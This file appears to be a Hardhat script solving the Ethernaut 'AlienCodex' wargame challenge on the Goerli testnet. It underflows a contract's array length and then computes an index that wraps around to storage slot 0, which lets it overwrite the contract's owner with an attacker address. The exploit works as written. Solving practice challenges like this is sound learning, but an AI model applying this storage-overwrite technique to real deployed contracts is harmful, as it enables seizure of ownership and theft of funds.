const { ethers } = require("hardhat");

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_RPC_URL);
const INSTANCE_ADDRESS = "0xEd2c22D7ff28B9Ac04fF27D35e7Fc8524912ffc2";
const address32Bytes = "0x000000000000000000000000c109141f53821F175fC316FC4254Fb6559E935C7";

async function main() {
    const instance = await ethers.getContractAt("AlienCodex", INSTANCE_ADDRESS);

    // Make contact first
    const contactTx = await instance.make_contact();
    await contactTx.wait(1);

    // Retract to underflow. Array length will be 2^256 after this.
    const tx = await instance.retract();
    const rec = await tx.wait();
    console.log("rec: ", rec);

    // Compute to find the index that will write to the slot 0.
    // keccak256(1) + index = 2^256
    const keccakValue = ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001"));
    const index = ethers.BigNumber.from("2").pow("256").sub(keccakValue);

    // Attack and change the storage slot 0.
    const attackTx = await instance.revise(index, address32Bytes);
    const attackReceipt = await attackTx.wait();
    console.log(attackReceipt);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});